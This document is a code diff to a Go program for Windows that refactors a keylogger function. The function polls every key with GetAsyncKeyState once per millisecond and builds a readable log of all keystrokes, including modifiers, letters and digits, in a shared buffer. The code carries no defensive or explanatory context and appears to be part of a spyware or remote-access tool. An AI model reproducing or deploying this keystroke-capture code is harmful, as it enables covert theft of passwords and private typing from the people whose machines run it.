@@ -4,231 +4,232 @@ import (
 	"time"
 
 	"github.com/AllenDang/w32"
+	"../utils"
 )
 
-func keyLogger() {
+func KeyLogger() {
 	for {
 		time.Sleep(1 * time.Millisecond)
 		for KEY := 0; KEY <= 256; KEY++ {
-			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
+			Val, _, _ := utils.ProcGetAsyncKeyState.Call(uintptr(KEY))
 			if int(Val) == -32767 {
 				switch KEY {
 				case w32.VK_CONTROL:
-					tmpKeylog += "[Ctrl]"
+					utils.TmpKeylog += "[Ctrl]"
 				case w32.VK_BACK:
-					tmpKeylog += "[Back]"
+					utils.TmpKeylog += "[Back]"
 				case w32.VK_TAB:
-					tmpKeylog += "[Tab]"
+					utils.TmpKeylog += "[Tab]"
 				case w32.VK_RETURN:
-					tmpKeylog += "[Enter]\r\n"
+					utils.TmpKeylog += "[Enter]\r\n"
 				case w32.VK_SHIFT:
-					tmpKeylog += "[Shift]"
+					utils.TmpKeylog += "[Shift]"
 				case w32.VK_MENU:
-					tmpKeylog += "[Alt]"
+					utils.TmpKeylog += "[Alt]"
 				case w32.VK_CAPITAL:
-					tmpKeylog += "[CapsLock]"
+					utils.TmpKeylog += "[CapsLock]"
 				case w32.VK_ESCAPE:
-					tmpKeylog += "[Esc]"
+					utils.TmpKeylog += "[Esc]"
 				case w32.VK_SPACE:
-					tmpKeylog += " "
+					utils.TmpKeylog += " "
 				case w32.VK_PRIOR:
-					tmpKeylog += "[PageUp]"
+					utils.TmpKeylog += "[PageUp]"
 				case w32.VK_NEXT:
-					tmpKeylog += "[PageDown]"
+					utils.TmpKeylog += "[PageDown]"
 				case w32.VK_END:
-					tmpKeylog += "[End]"
+					utils.TmpKeylog += "[End]"
 				case w32.VK_HOME:
-					tmpKeylog += "[Home]"
+					utils.TmpKeylog += "[Home]"
 				case w32.VK_LEFT:
-					tmpKeylog += "[Left]"
+					utils.TmpKeylog += "[Left]"
 				case w32.VK_UP:
-					tmpKeylog += "[Up]"
+					utils.TmpKeylog += "[Up]"
 				case w32.VK_RIGHT:
-					tmpKeylog += "[Right]"
+					utils.TmpKeylog += "[Right]"
 				case w32.VK_DOWN:
-					tmpKeylog += "[Down]"
+					utils.TmpKeylog += "[Down]"
 				case w32.VK_SELECT:
-					tmpKeylog += "[Select]"
+					utils.TmpKeylog += "[Select]"
 				case w32.VK_PRINT:
-					tmpKeylog += "[Print]"
+					utils.TmpKeylog += "[Print]"
 				case w32.VK_EXECUTE:
-					tmpKeylog += "[Execute]"
+					utils.TmpKeylog += "[Execute]"
 				case w32.VK_SNAPSHOT:
-					tmpKeylog += "[PrintScreen]"
+					utils.TmpKeylog += "[PrintScreen]"
 				case w32.VK_INSERT:
-					tmpKeylog += "[Insert]"
+					utils.TmpKeylog += "[Insert]"
 				case w32.VK_DELETE:
-					tmpKeylog += "[Delete]"
+					utils.TmpKeylog += "[Delete]"
 				case w32.VK_HELP:
-					tmpKeylog += "[Help]"
+					utils.TmpKeylog += "[Help]"
 				case w32.VK_LWIN:
-					tmpKeylog += "[LeftWindows]"
+					utils.TmpKeylog += "[LeftWindows]"
 				case w32.VK_RWIN:
-					tmpKeylog += "[RightWindows]"
+					utils.TmpKeylog += "[RightWindows]"
 				case w32.VK_APPS:
-					tmpKeylog += "[Applications]"
+					utils.TmpKeylog += "[Applications]"
 				case w32.VK_SLEEP:
-					tmpKeylog += "[Sleep]"
+					utils.TmpKeylog += "[Sleep]"
 				case w32.VK_NUMPAD0:
-					tmpKeylog += "[Pad 0]"
+					utils.TmpKeylog += "[Pad 0]"
 				case w32.VK_NUMPAD1:
-					tmpKeylog += "[Pad 1]"
+					utils.TmpKeylog += "[Pad 1]"
 				case w32.VK_NUMPAD2:
-					tmpKeylog += "[Pad 2]"
+					utils.TmpKeylog += "[Pad 2]"
 				case w32.VK_NUMPAD3:
-					tmpKeylog += "[Pad 3]"
+					utils.TmpKeylog += "[Pad 3]"
 				case w32.VK_NUMPAD4:
-					tmpKeylog += "[Pad 4]"
+					utils.TmpKeylog += "[Pad 4]"
 				case w32.VK_NUMPAD5:
-					tmpKeylog += "[Pad 5]"
+					utils.TmpKeylog += "[Pad 5]"
 				case w32.VK_NUMPAD6:
-					tmpKeylog += "[Pad 6]"
+					utils.TmpKeylog += "[Pad 6]"
 				case w32.VK_NUMPAD7:
-					tmpKeylog += "[Pad 7]"
+					utils.TmpKeylog += "[Pad 7]"
 				case w32.VK_NUMPAD8:
-					tmpKeylog += "[Pad 8]"
+					utils.TmpKeylog += "[Pad 8]"
 				case w32.VK_NUMPAD9:
-					tmpKeylog += "[Pad 9]"
+					utils.TmpKeylog += "[Pad 9]"
 				case w32.VK_MULTIPLY:
-					tmpKeylog += "*"
+					utils.TmpKeylog += "*"
 				case w32.VK_ADD:
-					tmpKeylog += "+"
+					utils.TmpKeylog += "+"
 				case w32.VK_SEPARATOR:
-					tmpKeylog += "[Separator]"
+					utils.TmpKeylog += "[Separator]"
 				case w32.VK_SUBTRACT:
-					tmpKeylog += "-"
+					utils.TmpKeylog += "-"
 				case w32.VK_DECIMAL:
-					tmpKeylog += "."
+					utils.TmpKeylog += "."
 				case w32.VK_DIVIDE:
-					tmpKeylog += "[Devide]"
+					utils.TmpKeylog += "[Devide]"
 				case w32.VK_F1:
-					tmpKeylog += "[F1]"
+					utils.TmpKeylog += "[F1]"
 				case w32.VK_F2:
-					tmpKeylog += "[F2]"
+					utils.TmpKeylog += "[F2]"
 				case w32.VK_F3:
-					tmpKeylog += "[F3]"
+					utils.TmpKeylog += "[F3]"
 				case w32.VK_F4:
-					tmpKeylog += "[F4]"
+					utils.TmpKeylog += "[F4]"
 				case w32.VK_F5:
-					tmpKeylog += "[F5]"
+					utils.TmpKeylog += "[F5]"
 				case w32.VK_F6:
-					tmpKeylog += "[F6]"
+					utils.TmpKeylog += "[F6]"
 				case w32.VK_F7:
-					tmpKeylog += "[F7]"
+					utils.TmpKeylog += "[F7]"
 				case w32.VK_F8:
-					tmpKeylog += "[F8]"
+					utils.TmpKeylog += "[F8]"
 				case w32.VK_F9:
-					tmpKeylog += "[F9]"
+					utils.TmpKeylog += "[F9]"
 				case w32.VK_F10:
-					tmpKeylog += "[F10]"
+					utils.TmpKeylog += "[F10]"
 				case w32.VK_F11:
-					tmpKeylog += "[F11]"
+					utils.TmpKeylog += "[F11]"
 				case w32.VK_F12:
-					tmpKeylog += "[F12]"
+					utils.TmpKeylog += "[F12]"
 				case w32.VK_NUMLOCK:
-					tmpKeylog += "[NumLock]"
+					utils.TmpKeylog += "[NumLock]"
 				case w32.VK_SCROLL:
-					tmpKeylog += "[ScrollLock]"
+					utils.TmpKeylog += "[ScrollLock]"
 				case w32.VK_LSHIFT:
-					tmpKeylog += "[LeftShift]"
+					utils.TmpKeylog += "[LeftShift]"
 				case w32.VK_RSHIFT:
-					tmpKeylog += "[RightShift]"
+					utils.TmpKeylog += "[RightShift]"
 				case w32.VK_LCONTROL:
-					tmpKeylog += "[LeftCtrl]"
+					utils.TmpKeylog += "[LeftCtrl]"
 				case w32.VK_RCONTROL:
-					tmpKeylog += "[RightCtrl]"
+					utils.TmpKeylog += "[RightCtrl]"
 				case w32.VK_LMENU:
-					tmpKeylog += "[LeftMenu]"
+					utils.TmpKeylog += "[LeftMenu]"
 				case w32.VK_RMENU:
-					tmpKeylog += "[RightMenu]"
+					utils.TmpKeylog += "[RightMenu]"
 				case w32.VK_OEM_1:
-					tmpKeylog += ";"
+					utils.TmpKeylog += ";"
 				case w32.VK_OEM_2:
-					tmpKeylog += "/"
+					utils.TmpKeylog += "/"
 				case w32.VK_OEM_3:
-					tmpKeylog += "`"
+					utils.TmpKeylog += "`"
 				case w32.VK_OEM_4:
-					tmpKeylog += "["
+					utils.TmpKeylog += "["
 				case w32.VK_OEM_5:
-					tmpKeylog += "\\"
+					utils.TmpKeylog += "\\"
 				case w32.VK_OEM_6:
-					tmpKeylog += "]"
+					utils.TmpKeylog += "]"
 				case w32.VK_OEM_7:
-					tmpKeylog += "'"
+					utils.TmpKeylog += "'"
 				case w32.VK_OEM_PERIOD:
-					tmpKeylog += "."
+					utils.TmpKeylog += "."
 				case 0x30:
-					tmpKeylog += "0"
+					utils.TmpKeylog += "0"
 				case 0x31:
-					tmpKeylog += "1"
+					utils.TmpKeylog += "1"
 				case 0x32:
-					tmpKeylog += "2"
+					utils.TmpKeylog += "2"
 				case 0x33:
-					tmpKeylog += "3"
+					utils.TmpKeylog += "3"
 				case 0x34:
-					tmpKeylog += "4"
+					utils.TmpKeylog += "4"
 				case 0x35:
-					tmpKeylog += "5"
+					utils.TmpKeylog += "5"
 				case 0x36:
-					tmpKeylog += "6"
+					utils.TmpKeylog += "6"
 				case 0x37:
-					tmpKeylog += "7"
+					utils.TmpKeylog += "7"
 				case 0x38:
-					tmpKeylog += "8"
+					utils.TmpKeylog += "8"
 				case 0x39:
-					tmpKeylog += "9"
+					utils.TmpKeylog += "9"
 				case 0x41:
-					tmpKeylog += "a"
+					utils.TmpKeylog += "a"
 				case 0x42:
-					tmpKeylog += "b"
+					utils.TmpKeylog += "b"
 				case 0x43:
-					tmpKeylog += "c"
+					utils.TmpKeylog += "c"
 				case 0x44:
-					tmpKeylog += "d"
+					utils.TmpKeylog += "d"
 				case 0x45:
-					tmpKeylog += "e"
+					utils.TmpKeylog += "e"
 				case 0x46:
-					tmpKeylog += "f"
+					utils.TmpKeylog += "f"
 				case 0x47:
-					tmpKeylog += "g"
+					utils.TmpKeylog += "g"
 				case 0x48:
-					tmpKeylog += "h"
+					utils.TmpKeylog += "h"
 				case 0x49:
-					tmpKeylog += "i"
+					utils.TmpKeylog += "i"
 				case 0x4A:
-					tmpKeylog += "j"
+					utils.TmpKeylog += "j"
 				case 0x4B:
-					tmpKeylog += "k"
+					utils.TmpKeylog += "k"
 				case 0x4C:
-					tmpKeylog += "l"
+					utils.TmpKeylog += "l"
 				case 0x4D:
-					tmpKeylog += "m"
+					utils.TmpKeylog += "m"
 				case 0x4E:
-					tmpKeylog += "n"
+					utils.TmpKeylog += "n"
 				case 0x4F:
-					tmpKeylog += "o"
+					utils.TmpKeylog += "o"
 				case 0x50:
-					tmpKeylog += "p"
+					utils.TmpKeylog += "p"
 				case 0x51:
-					tmpKeylog += "q"
+					utils.TmpKeylog += "q"
 				case 0x52:
-					tmpKeylog += "r"
+					utils.TmpKeylog += "r"
 				case 0x53:
-					tmpKeylog += "s"
+					utils.TmpKeylog += "s"
 				case 0x54:
-					tmpKeylog += "t"
+					utils.TmpKeylog += "t"
 				case 0x55:
-					tmpKeylog += "u"
+					utils.TmpKeylog += "u"
 				case 0x56:
-					tmpKeylog += "v"
+					utils.TmpKeylog += "v"
 				case 0x57:
-					tmpKeylog += "w"
+					utils.TmpKeylog += "w"
 				case 0x58:
-					tmpKeylog += "x"
+					utils.TmpKeylog += "x"
 				case 0x59:
-					tmpKeylog += "y"
+					utils.TmpKeylog += "y"
 				case 0x5A:
-					tmpKeylog += "z"
+					utils.TmpKeylog += "z"
 				}
 			}
 		}
